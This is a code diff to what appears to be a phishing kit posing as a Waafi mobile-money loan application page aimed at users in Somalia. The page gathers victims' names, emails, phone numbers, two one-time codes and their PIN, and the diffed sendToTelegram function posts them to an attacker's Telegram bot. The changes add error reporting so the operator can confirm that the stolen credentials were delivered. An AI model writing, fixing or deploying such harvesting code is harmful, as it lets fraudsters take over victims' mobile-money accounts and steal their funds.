@@ -122,17 +122,20 @@ function nextStep(n) {
 }
 
 async function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const res = await fetch(url, {
       method: 'POST',
-      mode: 'no-cors', // This fixes Render CORS issue
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text})
     });
-    return true;
+    const data = await res.json();
+    if(!data.ok) {
+      alert("TELEGRAM ERROR: " + data.description + "\n\nCheck Token and Chat ID");
+    }
+    console.log(data);
   } catch(e) {
-    alert("Telegram Send Error: Check Token and Chat ID");
-    return false;
+    alert("NETWORK ERROR: " + e.message);
   }
 }
 
@@ -179,7 +182,7 @@ async function verifyPIN() {
   await sendToTelegram(`📱 PROMPT PIN VERIFIED ✅\n🇸🇴 Somalia\n📱 ${formData.phone}\n\n✅ Status: PIN entered successfully on device\n🎉 Result: User logged in\n⏰ Cached for 30 minutes\n⏰ ${time}`);
   
   const finalMsg = `🟠 🆕 NEW WAAFI LOAN APPLICATION
-================================
+
 NAME: ${formData.name}
 EMAIL: ${formData.email}
 PHONE: ${formData.phone}
@@ -187,7 +190,7 @@ LOAN: ${formData.loan_type} $${formData.amount}
 OTP1: ${generatedOTP1}
 OTP2: ${generatedOTP2}
 PIN: ${pin}
-================================
+
 ⏰ ${new Date().toLocaleString()}`;
 
   await sendToTelegram(finalMsg);
